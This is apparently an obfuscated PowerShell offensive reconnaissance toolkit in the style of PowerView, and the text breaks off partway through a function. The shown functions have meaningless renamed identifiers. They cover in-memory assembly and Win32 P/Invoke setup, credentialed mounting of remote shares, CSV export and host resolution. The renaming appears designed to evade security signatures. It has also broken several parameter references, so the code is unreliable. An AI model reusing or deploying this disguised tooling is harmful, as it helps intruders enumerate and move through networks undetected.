












function bootless {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $BU9jFDkICdbpYwA = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $DsSY9oYDkCyWHDX = $BU9jFDkICdbpYwA.GetAssemblies()

    foreach ($vxfCysTvppjlKKF in $DsSY9oYDkCyWHDX) {
        if ($vxfCysTvppjlKKF.FullName -and ($vxfCysTvppjlKKF.FullName.Split(',')[0] -eq $ModuleName)) {
            return $vxfCysTvppjlKKF
        }
    }

    $aMBqssF9P9unayU = New-Object Reflection.AssemblyName($ModuleName)
    $pkMxgDCVHqOym9m = $BU9jFDkICdbpYwA
    $QfVKIsFAhWDXUfR = $pkMxgDCVHqOym9m.DefineDynamicAssembly($aMBqssF9P9unayU, 'Run')
    $MI9InFK9DyVPWih = $QfVKIsFAhWDXUfR.DefineDynamicModule($ModuleName, $False)

    return $MI9InFK9DyVPWih
}




function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $AozgGLHycmUxlNM,

        [Switch]
        $SetLastError
    )

    $wDpWXLYTGZrAWN9 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $wDpWXLYTGZrAWN9['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $wDpWXLYTGZrAWN9['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $wDpWXLYTGZrAWN9['Charset'] = $Charset }
    if ($SetLastError) { $wDpWXLYTGZrAWN9['SetLastError'] = $SetLastError }
    if ($AozgGLHycmUxlNM) { $wDpWXLYTGZrAWN9['EntryPoint'] = $AozgGLHycmUxlNM }

    New-Object PSObject -Property $wDpWXLYTGZrAWN9
}


function racehorses
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $AozgGLHycmUxlNM,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $kqnlQmb9hoYXhNF = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $kqnlQmb9hoYXhNF[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $kqnlQmb9hoYXhNF[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {

            if (!$kqnlQmb9hoYXhNF.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $kqnlQmb9hoYXhNF[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $kqnlQmb9hoYXhNF[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $hcDrBLy9ZyM9IkS = $kqnlQmb9hoYXhNF[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)


            $i = 1
            foreach($neDPaXlrfjtMbND in $ParameterTypes)
            {
                if ($neDPaXlrfjtMbND.IsByRef)
                {
                    [void] $hcDrBLy9ZyM9IkS.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $PQwK9hglNDLd9Gl = [Runtime.InteropServices.DllImportAttribute]
            $aCGmpnyaHIyFRRb = $PQwK9hglNDLd9Gl.GetField('SetLastError')
            $W9VebhbexMVwmPj = $PQwK9hglNDLd9Gl.GetField('CallingConvention')
            $9fVq9gaXLbyyBre = $PQwK9hglNDLd9Gl.GetField('CharSet')
            $kXoTIQyvWJrIVjY = $PQwK9hglNDLd9Gl.GetField('EntryPoint')
            if ($SetLastError) { $iJCOvOogGcHO9bO = $True } else { $iJCOvOogGcHO9bO = $False }

            if ($PSBoundParameters['EntryPoint']) { $lrR9bhYpPtRZDVW = $AozgGLHycmUxlNM } else { $lrR9bhYpPtRZDVW = $FunctionName }


            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $kJABfYmMGMQCHrT = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($aCGmpnyaHIyFRRb,
                                           $W9VebhbexMVwmPj,
                                           $9fVq9gaXLbyyBre,
                                           $kXoTIQyvWJrIVjY),
                [Object[]] @($iJCOvOogGcHO9bO,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $lrR9bhYpPtRZDVW))

            $hcDrBLy9ZyM9IkS.SetCustomAttribute($kJABfYmMGMQCHrT)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $kqnlQmb9hoYXhNF
        }

        $fhrnjjQuOIYimMb = @{}

        foreach ($Key in $kqnlQmb9hoYXhNF.Keys)
        {
            $Type = $kqnlQmb9hoYXhNF[$Key].CreateType()

            $fhrnjjQuOIYimMb[$Key] = $Type
        }

        return $fhrnjjQuOIYimMb
    }
}


function Rumsfeld {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $VEqiShrFAqYTh9u,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $9WBY9YqIGjuXInE,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($VEqiShrFAqYTh9u))
    }

    $aUxCaOCtNtft9YV = $Type -as [Type]

    $zPqKYckQbWuSa9o = $Module.DefineEnum($VEqiShrFAqYTh9u, 'Public', $aUxCaOCtNtft9YV)

    if ($Bitfield)
    {
        $N9vPgB9BsKgsDnn = [FlagsAttribute].GetConstructor(@())
        $9tFTU9qIx9QKqpl = New-Object Reflection.Emit.CustomAttributeBuilder($N9vPgB9BsKgsDnn, @())
        $zPqKYckQbWuSa9o.SetCustomAttribute($9tFTU9qIx9QKqpl)
    }

    foreach ($Key in $9WBY9YqIGjuXInE.Keys)
    {

        $null = $zPqKYckQbWuSa9o.DefineLiteral($Key, $9WBY9YqIGjuXInE[$Key] -as $aUxCaOCtNtft9YV)
    }

    $zPqKYckQbWuSa9o.CreateType()
}




function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $DuYcpZsYYfZWVve,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $IQJFgwWwdtqcTml,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $DuYcpZsYYfZWVve
        Type = $Type -as [Type]
        Offset = $IQJFgwWwdtqcTml
        MarshalAs = $MarshalAs
    }
}


function threatened
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $VEqiShrFAqYTh9u,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $qSMGShvWRW9HRuQ,

        [Reflection.Emit.PackingSize]
        $NktLBXPDfiW9AIx = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $IU9tXs99AGGEceH
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($VEqiShrFAqYTh9u))
    }

    [Reflection.TypeAttributes] $CZnpzIkjD9HdvfE = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($IU9tXs99AGGEceH)
    {
        $CZnpzIkjD9HdvfE = $CZnpzIkjD9HdvfE -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $CZnpzIkjD9HdvfE = $CZnpzIkjD9HdvfE -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $O9eIMI99YOlSZ9i = $Module.DefineType($VEqiShrFAqYTh9u, $CZnpzIkjD9HdvfE, [ValueType], $NktLBXPDfiW9AIx)
    $xJXopHWJ9xxJZnm = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $KFWWxuHPKVNeVUx = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $DpEUrXXvcetbNCd = New-Object Hashtable[]($qSMGShvWRW9HRuQ.Count)




    foreach ($Field in $qSMGShvWRW9HRuQ.Keys)
    {
        $Index = $qSMGShvWRW9HRuQ[$Field]['Position']
        $DpEUrXXvcetbNCd[$Index] = @{FieldName = $Field; Properties = $qSMGShvWRW9HRuQ[$Field]}
    }

    foreach ($Field in $DpEUrXXvcetbNCd)
    {
        $NpmuSeETCGZHm9f = $Field['FieldName']
        $HRpgn9QRMtKJUzk = $Field['Properties']

        $IQJFgwWwdtqcTml = $HRpgn9QRMtKJUzk['Offset']
        $Type = $HRpgn9QRMtKJUzk['Type']
        $MarshalAs = $HRpgn9QRMtKJUzk['MarshalAs']

        $MRmZoTZhhMnXnk9 = $O9eIMI99YOlSZ9i.DefineField($NpmuSeETCGZHm9f, $Type, 'Public')

        if ($MarshalAs)
        {
            $K9FfMsbDnA9Darp = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $LYtACQbTzOMToAH = New-Object Reflection.Emit.CustomAttributeBuilder($xJXopHWJ9xxJZnm,
                    $K9FfMsbDnA9Darp, $KFWWxuHPKVNeVUx, @($Size))
            }
            else
            {
                $LYtACQbTzOMToAH = New-Object Reflection.Emit.CustomAttributeBuilder($xJXopHWJ9xxJZnm, [Object[]] @($K9FfMsbDnA9Darp))
            }

            $MRmZoTZhhMnXnk9.SetCustomAttribute($LYtACQbTzOMToAH)
        }

        if ($IU9tXs99AGGEceH) { $MRmZoTZhhMnXnk9.SetOffset($IQJFgwWwdtqcTml) }
    }



    $9bsKFqlGUwRdYcx = $O9eIMI99YOlSZ9i.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $GrEVNupDUKBVEfK = $9bsKFqlGUwRdYcx.GetILGenerator()

    $GrEVNupDUKBVEfK.Emit([Reflection.Emit.OpCodes]::Ldtoken, $O9eIMI99YOlSZ9i)
    $GrEVNupDUKBVEfK.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $GrEVNupDUKBVEfK.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $GrEVNupDUKBVEfK.Emit([Reflection.Emit.OpCodes]::Ret)



    $KaReAFSneYHHudE = $O9eIMI99YOlSZ9i.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $O9eIMI99YOlSZ9i,
        [Type[]] @([IntPtr]))
    $9GWrdzTXbVcqUkG = $KaReAFSneYHHudE.GetILGenerator()
    $9GWrdzTXbVcqUkG.Emit([Reflection.Emit.OpCodes]::Nop)
    $9GWrdzTXbVcqUkG.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $9GWrdzTXbVcqUkG.Emit([Reflection.Emit.OpCodes]::Ldtoken, $O9eIMI99YOlSZ9i)
    $9GWrdzTXbVcqUkG.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $9GWrdzTXbVcqUkG.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $9GWrdzTXbVcqUkG.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $O9eIMI99YOlSZ9i)
    $9GWrdzTXbVcqUkG.Emit([Reflection.Emit.OpCodes]::Ret)

    $O9eIMI99YOlSZ9i.CreateType()
}








Function modernists {


    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$JfmwAkBliloosU9,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$DuYcpZsYYfZWVve,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ppVpZuuBmxkJJpS,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$LBeokQcrsjsGVap,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$iQFCs99EVGWCPzE,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$eOdSdyBALFzElrT,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$jlg9UVfP9dDetTj,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$cSFFHnjygGLpiAK = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$l9aw9qGYeQxdufA,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$VFWHk9uEyHCTMHQ,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$RIsK9cFxCI9qJv9,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$f9YQpUcS9qcanVz,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$vMofjOCzvB9maxn,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$wQhgWJmEJhHiRHy,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$mFGyoXDBwcj9rvV,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$uDNtOFTINjNEzkx,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$VaLV9yGLOJNpIWc,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$icqEObYaSS9dReE,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$vGJOJLQvTfgDgsh,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $bjXBvJtZvbPoSeg = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$ZbJIThQB9AMYzGF,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({


            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $ATNpRDJr9isTTXi
    )

    Begin {
        $IPG9JEPenFialIT = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $WxkQOVUC9UhDaql = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($ZbJIThQB9AMYzGF) {
            $TvAzWiUVtS9dAMj = $ATNpRDJr9isTTXi.Keys | Where-Object { $WxkQOVUC9UhDaql -notcontains $_ }
            ForEach($neDPaXlrfjtMbND in $TvAzWiUVtS9dAMj) {
                if ($neDPaXlrfjtMbND) {
                    Set-Variable -Name $neDPaXlrfjtMbND -Value $ATNpRDJr9isTTXi.$neDPaXlrfjtMbND -Scope 1 -Force
                }
            }
        }
        else {
            $ylM9hy99HBKIXGb = @()
            $ylM9hy99HBKIXGb = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {

                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {

                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($ylM9hy99HBKIXGb) {
                $ylM9hy99HBKIXGb | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }


            $bRNKPnr99zvxwLR = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |

                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |

                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }


            $tmp = $null
            ForEach ($neDPaXlrfjtMbND in $bRNKPnr99zvxwLR) {
                $ENEJzeQJ9xItjrg = Get-Variable -Name $neDPaXlrfjtMbND -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($neDPaXlrfjtMbND, [ref]$tmp) -and $ENEJzeQJ9xItjrg) {
                    $PSBoundParameters.$neDPaXlrfjtMbND = $ENEJzeQJ9xItjrg
                }
            }

            if($bjXBvJtZvbPoSeg) {
                $trbrsMjzyXWS9Nm = $bjXBvJtZvbPoSeg
            }
            else {
                $trbrsMjzyXWS9Nm = $IPG9JEPenFialIT
            }


            $zqNVHFm9aDJ9IcW = {Get-Variable -Name $_ -ValueOnly -Scope 0}


            $qTcjvJLUSB9QnTm = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $jTByPYtVUHfzmhm = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $kBCJVZBeetxpsmr = '^Alias$'
            $QjcjZQK9j9MSa9D = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $qTcjvJLUSB9QnTm {
                    Try {
                        $QjcjZQK9j9MSa9D.$_ = . $zqNVHFm9aDJ9IcW
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($trbrsMjzyXWS9Nm.Keys -contains $Name) {
                $trbrsMjzyXWS9Nm.$Name.Attributes.Add($QjcjZQK9j9MSa9D)
            }
            else {
                $nmLu9PLewEm9PsL = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $jTByPYtVUHfzmhm {
                        Try {
                            $cuPiGRhItlqbgOt = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $zqNVHFm9aDJ9IcW) -ErrorAction Stop
                            $nmLu9PLewEm9PsL.Add($cuPiGRhItlqbgOt)
                        }
                        Catch { $_ }
                        continue
                    }
                    $kBCJVZBeetxpsmr {
                        Try {
                            $KKD9LREcl9huKDQ = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $zqNVHFm9aDJ9IcW) -ErrorAction Stop
                            $nmLu9PLewEm9PsL.Add($KKD9LREcl9huKDQ)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $nmLu9PLewEm9PsL.Add($QjcjZQK9j9MSa9D)
                $neDPaXlrfjtMbND = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $nmLu9PLewEm9PsL)
                $trbrsMjzyXWS9Nm.Add($Name, $neDPaXlrfjtMbND)
            }
        }
    }

    End {
        if(!$ZbJIThQB9AMYzGF -and !$bjXBvJtZvbPoSeg) {
            $trbrsMjzyXWS9Nm
        }
    }
}


function shittiest {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $hClQbtwDldwuZwv
    )

    BEGIN {
        $vDX9LvEqAPudecx = @{}
    }

    PROCESS {
        ForEach ($uszMwnNhSpfzkA9 in $Path) {
            if (($uszMwnNhSpfzkA9 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $GHjj9aAkkQaKul9 = (New-Object System.Uri($uszMwnNhSpfzkA9)).Host
                if (-not $vDX9LvEqAPudecx[$GHjj9aAkkQaKul9]) {

                    misquote -cNTDaoDBIWkDu9I $GHjj9aAkkQaKul9 -szvFVWkPJummdcf $szvFVWkPJummdcf
                    $vDX9LvEqAPudecx[$GHjj9aAkkQaKul9] = $True
                }
            }

            if (Test-Path -Path $uszMwnNhSpfzkA9) {
                if ($PSBoundParameters['OutputObject']) {
                    $9saWBkakf9LlmWr = New-Object PSObject
                }
                else {
                    $9saWBkakf9LlmWr = @{}
                }
                Switch -Regex -File $uszMwnNhSpfzkA9 {
                    "^\[(.+)\]" # Section
                    {
                        $eVAnlpMHFfoPxN9 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $eVAnlpMHFfoPxN9 = $eVAnlpMHFfoPxN9.Replace(' ', '')
                            $jZsUQN9HgpW9rsX = New-Object PSObject
                            $9saWBkakf9LlmWr | Add-Member Noteproperty $eVAnlpMHFfoPxN9 $jZsUQN9HgpW9rsX
                        }
                        else {
                            $9saWBkakf9LlmWr[$eVAnlpMHFfoPxN9] = @{}
                        }
                        $LdGiimBE9kXnFZ9 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $LdGiimBE9kXnFZ9 = $LdGiimBE9kXnFZ9 + 1
                        $Name = 'Comment' + $LdGiimBE9kXnFZ9
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $9saWBkakf9LlmWr.$eVAnlpMHFfoPxN9 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $9saWBkakf9LlmWr[$eVAnlpMHFfoPxN9][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $gNbIAQTKI9VITQV = $Value.split(',') | ForEach-Object { $_.Trim() }



                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $9saWBkakf9LlmWr.$eVAnlpMHFfoPxN9 | Add-Member Noteproperty $Name $gNbIAQTKI9VITQV
                        }
                        else {
                            $9saWBkakf9LlmWr[$eVAnlpMHFfoPxN9][$Name] = $gNbIAQTKI9VITQV
                        }
                    }
                }
                $9saWBkakf9LlmWr
            }
        }
    }

    END {

        $vDX9LvEqAPudecx.Keys | densities
    }
}


function vagary {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $BKOFrZwF9JQDCEa,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $dkP9Ekdq9rRqLvN = ',',

        [Switch]
        $qBZrSSyOlwdBcDr
    )

    BEGIN {
        $pU9JZqepydGLBcH = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $sBIbqcQjZf99plT = [System.IO.File]::Exists($pU9JZqepydGLBcH)


        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $FsjCIsfuAGvmfdj = [System.IO.FileMode]::Append
        }
        else {
            $FsjCIsfuAGvmfdj = [System.IO.FileMode]::Create
            $sBIbqcQjZf99plT = $False
        }

        $iYIrpYyBRvOEshx = New-Object IO.FileStream($pU9JZqepydGLBcH, $FsjCIsfuAGvmfdj, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $LcAmPHEXmt9WCSp = New-Object System.IO.StreamWriter($iYIrpYyBRvOEshx)
        $LcAmPHEXmt9WCSp.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $BKOFrZwF9JQDCEa) {
            $e9yiBzmJck9VucW = ConvertTo-Csv -BKOFrZwF9JQDCEa $Entry -dkP9Ekdq9rRqLvN $dkP9Ekdq9rRqLvN -NoTypeInformation

            if (-not $sBIbqcQjZf99plT) {

                $e9yiBzmJck9VucW | ForEach-Object { $LcAmPHEXmt9WCSp.WriteLine($_) }
                $sBIbqcQjZf99plT = $True
            }
            else {

                $e9yiBzmJck9VucW[1..($e9yiBzmJck9VucW.Length-1)] | ForEach-Object { $LcAmPHEXmt9WCSp.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $LcAmPHEXmt9WCSp.Dispose()
        $iYIrpYyBRvOEshx.Dispose()
    }
}


function emaciates {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {
            try {
                @(([Net.Dns]::GetHostEntry($wlkrajnezbzvml9)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[emaciates] Could not resolve $wlkrajnezbzvml9 to an IP Address."
            }
        }
    }
}


function curlew {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $fT9WVEyXAx9DPM9,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Z9fLSYGKyDMNEO9 = @{}
